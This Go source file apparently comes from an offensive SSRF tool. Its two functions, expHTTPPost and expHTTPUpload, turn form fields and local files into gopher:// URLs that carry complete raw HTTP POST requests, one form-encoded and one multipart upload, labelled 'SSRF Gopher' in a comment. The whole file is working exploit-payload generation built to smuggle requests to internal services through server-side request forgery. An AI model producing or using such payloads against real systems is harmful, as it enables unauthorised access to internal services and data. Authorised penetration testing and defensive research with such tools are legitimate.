package gopher

import (
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"net/url"
	"os"
	"strings"
)

func expHTTPPost(addr string, uri string, datas map[string]string) (string, error) {
	p := url.Values{}
	for key, value := range datas {
		p.Add(key, value)
	}
	data := p.Encode()
	headers := []string{
		fmt.Sprintf("POST %s HTTP/1.1", uri),
		fmt.Sprintf("Host: %s", addr),
		"Content-Type: application/x-www-form-urlencoded",
		fmt.Sprintf("Content-Length: %d", len(data)),
	}
	exp := fmt.Sprintf(
		"gopher://%s/_%s",
		addr,
		strings.ReplaceAll(url.QueryEscape(fmt.Sprintf("%s\r\n\r\n%s", strings.Join(headers, "\r\n"), data)), "+", "%20"),
	)
	return exp, nil
}

func expHTTPUpload(addr string, uri string, datas map[string]string) (string, error) {
	bodyBuffer := &bytes.Buffer{}
	bodyWriter := multipart.NewWriter(bodyBuffer)
	// Field
	for key, value := range datas {
		if strings.HasPrefix(value, "@") {
			name := strings.TrimPrefix(value, "@")
			fw, _ := bodyWriter.CreateFormFile(key, name)
			f, _ := os.Open(name)
			defer f.Close()
			io.Copy(fw, f)
		} else {
			_ = bodyWriter.WriteField(key, value)
		}
	}
	contentType := bodyWriter.FormDataContentType()
	bodyWriter.Close()
	// SSRF Gopher
	data := bodyBuffer.String()
	headers := []string{
		fmt.Sprintf("POST %s HTTP/1.1", uri),
		fmt.Sprintf("Host: %s", addr),
		fmt.Sprintf("Content-Type: %s", contentType),
		fmt.Sprintf("Content-Length: %d", len(data)),
	}
	exp := fmt.Sprintf(
		"gopher://%s/_%s",
		addr,
		strings.ReplaceAll(url.QueryEscape(fmt.Sprintf("%s\r\n\r\n%s", strings.Join(headers, "\r\n"), data)), "+", "%20"),
	)
	return exp, nil
}
